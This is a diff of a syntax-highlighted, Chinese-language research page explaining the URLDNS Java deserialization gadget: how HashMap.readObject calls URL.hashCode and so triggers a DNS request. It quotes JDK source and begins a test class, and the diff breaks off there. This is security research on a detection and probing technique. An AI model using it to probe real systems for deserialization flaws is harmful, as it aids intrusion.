+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        String protocol <span style="color:#f92672">=</span> u<span style="color:#f92672">.</span><span style="color:#a6e22e">getProtocol</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>protocol <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            h <span style="color:#f92672">+=</span> protocol<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">();</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the host part.</span>
-</span></span><span style="display:flex;"><span>        InetAddress addr <span style="color:#f92672">=</span> getHostAddress(u);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (addr <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            h <span style="color:#f92672">+=</span> addr.<span style="color:#a6e22e">hashCode</span>();
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            String host <span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getHost</span>();
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (host <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
-</span></span><span style="display:flex;"><span>                h <span style="color:#f92672">+=</span> host.<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">hashCode</span>();
-</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Generate the host part.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        InetAddress addr <span style="color:#f92672">=</span> getHostAddress<span style="color:#f92672">(</span>u<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>addr <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            h <span style="color:#f92672">+=</span> addr<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            String host <span style="color:#f92672">=</span> u<span style="color:#f92672">.</span><span style="color:#a6e22e">getHost</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>host <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                h <span style="color:#f92672">+=</span> host<span style="color:#f92672">.</span><span style="color:#a6e22e">toLowerCase</span><span style="color:#f92672">().</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>通过调用URL类的equals和hashCode方法即可触发DNS请求</p>
 <h4 id="hashmap原理">HashMap原理</h4>
 <p><strong>数据结构</strong></p>
 <p>HashMap采用数组+链表方式存储键值对，其中链表为单向链表</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">transient</span> Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span> table;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Node</span><span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">implements</span> Map.<span style="color:#a6e22e">Entry</span><span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> hash;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> K key;
-</span></span><span style="display:flex;"><span>        V value;
-</span></span><span style="display:flex;"><span>        Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;</span> next;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">transient</span> Node<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;[]</span> table<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Node</span><span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">implements</span> Map<span style="color:#f92672">.</span><span style="color:#a6e22e">Entry</span><span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> hash<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> K key<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        V value<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        Node<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;</span> next<span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        Node(<span style="color:#66d9ef">int</span> hash, K key, V value, Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;</span> next) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> hash;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> key;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> value;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">next</span> <span style="color:#f92672">=</span> next;
-</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        Node<span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> hash<span style="color:#f92672">,</span> K key<span style="color:#f92672">,</span> V value<span style="color:#f92672">,</span> Node<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;</span> next<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> hash<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> key<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> value<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">next</span> <span style="color:#f92672">=</span> next<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>默认情况下java中的HashMap大小只有16，当产生hash冲突时，就把它插入到链表中的下一个元素，在取出元素时，首先计算hash，根据hash找到对应的链表，而后遍历链表获取到value。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> DEFAULT_INITIAL_CAPACITY <span style="color:#f92672">=</span> 1 <span style="color:#f92672">&lt;&lt;</span> 4;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> DEFAULT_INITIAL_CAPACITY <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">;</span>
 </span></span></code></pre></div><p>可以用如下图
 
 <img alt="" src="/images/research/web/java-deserialization/urldns.zh-cn.assets/1.webp" /></p>
 <p>HashMap重写了readObject方法，反序列化HashMap数据时会调用重写的readObject方法，代码如下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span>
-</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">defaultReadObject</span>();
-</span></span><span style="display:flex;"><span>        reinitialize();
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (loadFactor <span style="color:#f92672">&lt;=</span> 0 <span style="color:#f92672">||</span> Float.<span style="color:#a6e22e">isNaN</span>(loadFactor))
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">&#34;Illegal load factor: &#34;</span> <span style="color:#f92672">+</span>
-</span></span><span style="display:flex;"><span>                                             loadFactor);
-</span></span><span style="display:flex;"><span>        s.<span style="color:#a6e22e">readInt</span>();                <span style="color:#75715e">// Read and ignore number of buckets</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> mappings <span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readInt</span>(); <span style="color:#75715e">// Read number of mappings (size)</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (mappings <span style="color:#f92672">&lt;</span> 0)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">&#34;Illegal mappings count: &#34;</span> <span style="color:#f92672">+</span>
-</span></span><span style="display:flex;"><span>                                             mappings);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (mappings <span style="color:#f92672">&gt;</span> 0) { <span style="color:#75715e">// (if zero, use defaults)</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Size the table using given load factor only if within</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// range of 0.25...4.0</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> lf <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">min</span>(Math.<span style="color:#a6e22e">max</span>(0.<span style="color:#a6e22e">25f</span>, loadFactor), 4.<span style="color:#a6e22e">0f</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> fc <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)mappings <span style="color:#f92672">/</span> lf <span style="color:#f92672">+</span> 1.<span style="color:#a6e22e">0f</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> cap <span style="color:#f92672">=</span> ((fc <span style="color:#f92672">&lt;</span> DEFAULT_INITIAL_CAPACITY) <span style="color:#f92672">?</span>
-</span></span><span style="display:flex;"><span>                       DEFAULT_INITIAL_CAPACITY :
-</span></span><span style="display:flex;"><span>                       (fc <span style="color:#f92672">&gt;=</span> MAXIMUM_CAPACITY) <span style="color:#f92672">?</span>
-</span></span><span style="display:flex;"><span>                       MAXIMUM_CAPACITY :
-</span></span><span style="display:flex;"><span>                       tableSizeFor((<span style="color:#66d9ef">int</span>)fc));
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> ft <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)cap <span style="color:#f92672">*</span> lf;
-</span></span><span style="display:flex;"><span>            threshold <span style="color:#f92672">=</span> ((cap <span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY <span style="color:#f92672">&amp;&amp;</span> ft <span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY) <span style="color:#f92672">?</span>
-</span></span><span style="display:flex;"><span>                         (<span style="color:#66d9ef">int</span>)ft : Integer.<span style="color:#a6e22e">MAX_VALUE</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span><span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ObjectInputStream</span> s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ClassNotFoundException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Read in the threshold (ignored), loadfactor, and any hidden stuff
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        s<span style="color:#f92672">.</span><span style="color:#a6e22e">defaultReadObject</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        reinitialize<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>loadFactor <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> Float<span style="color:#f92672">.</span><span style="color:#a6e22e">isNaN</span><span style="color:#f92672">(</span>loadFactor<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Illegal load factor: &#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                                             loadFactor<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span><span style="color:#a6e22e">readInt</span><span style="color:#f92672">();</span>                <span style="color:#75715e">// Read and ignore number of buckets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">int</span> mappings <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">readInt</span><span style="color:#f92672">();</span> <span style="color:#75715e">// Read number of mappings (size)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>mappings <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidObjectException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Illegal mappings count: &#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>                                             mappings<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>mappings <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#75715e">// (if zero, use defaults)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// Size the table using given load factor only if within
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// range of 0.25...4.0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">float</span> lf <span style="color:#f92672">=</span> Math<span style="color:#f92672">.</span><span style="color:#a6e22e">min</span><span style="color:#f92672">(</span>Math<span style="color:#f92672">.</span><span style="color:#a6e22e">max</span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">.</span><span style="color:#a6e22e">25f</span><span style="color:#f92672">,</span> loadFactor<span style="color:#f92672">),</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">.</span><span style="color:#a6e22e">0f</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> fc <span style="color:#f92672">=</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">float</span><span style="color:#f92672">)</span>mappings <span style="color:#f92672">/</span> lf <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#a6e22e">0f</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> cap <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>fc <span style="color:#f92672">&lt;</span> DEFAULT_INITIAL_CAPACITY<span style="color:#f92672">)</span> <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>                       DEFAULT_INITIAL_CAPACITY <span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                       <span style="color:#f92672">(</span>fc <span style="color:#f92672">&gt;=</span> MAXIMUM_CAPACITY<span style="color:#f92672">)</span> <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>                       MAXIMUM_CAPACITY <span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                       tableSizeFor<span style="color:#f92672">((</span><span style="color:#66d9ef">int</span><span style="color:#f92672">)</span>fc<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">float</span> ft <span style="color:#f92672">=</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">float</span><span style="color:#f92672">)</span>cap <span style="color:#f92672">*</span> lf<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            threshold <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>cap <span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY <span style="color:#f92672">&amp;&amp;</span> ft <span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY<span style="color:#f92672">)</span> <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>                         <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span><span style="color:#f92672">)</span>ft <span style="color:#f92672">:</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">MAX_VALUE</span><span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Check Map.Entry[].class since it&#39;s the nearest public type to</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// what we&#39;re actually creating.</span>
-</span></span><span style="display:flex;"><span>            SharedSecrets.<span style="color:#a6e22e">getJavaObjectInputStreamAccess</span>().<span style="color:#a6e22e">checkArray</span>(s, Map.<span style="color:#a6e22e">Entry</span><span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, cap);
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">@SuppressWarnings</span>({<span style="color:#e6db74">&#34;rawtypes&#34;</span>,<span style="color:#e6db74">&#34;unchecked&#34;</span>})
-</span></span><span style="display:flex;"><span>            Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span> tab <span style="color:#f92672">=</span> (Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">&gt;[]</span>)<span style="color:#66d9ef">new</span> Node<span style="color:#f92672">[</span>cap<span style="color:#f92672">]</span>;
-</span></span><span style="display:flex;"><span>            table <span style="color:#f92672">=</span> tab;
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Check Map.Entry[].class since it&#39;s the nearest public type to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// what we&#39;re actually creating.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            SharedSecrets<span style="color:#f92672">.</span><span style="color:#a6e22e">getJavaObjectInputStreamAccess</span><span style="color:#f92672">().</span><span style="color:#a6e22e">checkArray</span><span style="color:#f92672">(</span>s<span style="color:#f92672">,</span> Map<span style="color:#f92672">.</span><span style="color:#a6e22e">Entry</span><span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> cap<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">@SuppressWarnings</span><span style="color:#f92672">({</span><span style="color:#e6db74">&#34;rawtypes&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;unchecked&#34;</span><span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>            Node<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;[]</span> tab <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Node<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;[])</span><span style="color:#66d9ef">new</span> Node<span style="color:#f92672">[</span>cap<span style="color:#f92672">];</span>
+</span></span><span style="display:flex;"><span>            table <span style="color:#f92672">=</span> tab<span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> mappings; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">&#34;unchecked&#34;</span>)
-</span></span><span style="display:flex;"><span>                    K key <span style="color:#f92672">=</span> (K) s.<span style="color:#a6e22e">readObject</span>();
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">&#34;unchecked&#34;</span>)
-</span></span><span style="display:flex;"><span>                    V value <span style="color:#f92672">=</span> (V) s.<span style="color:#a6e22e">readObject</span>();
-</span></span><span style="display:flex;"><span>                putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">false</span>);
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> mappings<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;unchecked&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                    K key <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>K<span style="color:#f92672">)</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;unchecked&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                    V value <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>V<span style="color:#f92672">)</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>                putVal<span style="color:#f92672">(</span>hash<span style="color:#f92672">(</span>key<span style="color:#f92672">),</span> key<span style="color:#f92672">,</span> value<span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>可以知道，readObject方法会获取有多少个数据，而后进行通过for循环循环从数据流中读取对象信息，并通过putVal方法加入到HashMap中，其中键为<code>hash(key)</code>，也就是会尝试调用key对应类的hashCode方法计算hash值。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span>(Object key) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> h;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (key <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#f92672">?</span> 0 : (h <span style="color:#f92672">=</span> key.<span style="color:#a6e22e">hashCode</span>()) <span style="color:#f92672">^</span> (h <span style="color:#f92672">&gt;&gt;&gt;</span> 16);
-</span></span><span style="display:flex;"><span>    }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span><span style="color:#f92672">(</span>Object key<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> h<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>key <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">:</span> <span style="color:#f92672">(</span>h <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">())</span> <span style="color:#f92672">^</span> <span style="color:#f92672">(</span>h <span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>如果key对象为URL类，通过前面我们知道URL.hashCode方法会触发DNS请求，这也是URLDNS的原理。</p>
 <p><em>以上代码来源于JDK 12.0.1</em></p>
 <blockquote>
@@ -2642,64 +2680,64 @@
 </blockquote>
 <p><strong>实际测试</strong></p>
 <p>使用如下代码进行测试</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">urltest</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
-</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;hello &#34;</span>);
-</span></span><span style="display:flex;"><span>        URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://www.baidu.com/1&#34;</span>);
-</span></span><span style="display:flex;"><span>        URL u1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://www.aliyun.com/1&#34;</span>);
-</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>URL,String<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>URL,String<span style="color:#f92672">&gt;</span>();
-</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(u,<span style="color:#e6db74">&#34;1&#34;</span>);
-</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(u1,<span style="color:#e6db74">&#34;1&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">urltest</span> <span style="color:#f92672">{</span>
